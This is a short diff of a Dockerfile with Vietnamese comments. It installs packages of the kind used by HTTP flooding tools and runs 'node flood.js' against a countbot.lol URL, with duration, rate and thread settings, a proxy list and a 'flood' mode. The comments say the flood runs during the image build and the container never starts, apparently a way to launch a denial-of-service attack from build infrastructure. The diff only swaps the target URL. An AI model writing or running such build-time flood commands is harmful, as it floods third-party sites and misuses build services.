@@ -20,6 +20,6 @@ RUN npm install hpack https commander colors socks set-cookie-parser
 RUN node -v && npm -v
 
 # Chạy script ngay trong quá trình build rồi thoát
-RUN node flood.js https://countbot.lol/7371969470-e4644541-a352-48dd-97be-185e93e08c08 120 10 10 live.txt flood
+RUN node flood.js https://countbot.lol/7371969470-fba1dac3-6feb-488d-a570-3af5cc84d628 120 10 10 live.txt flood
 
 # Container sẽ không khởi động sau khi build xong
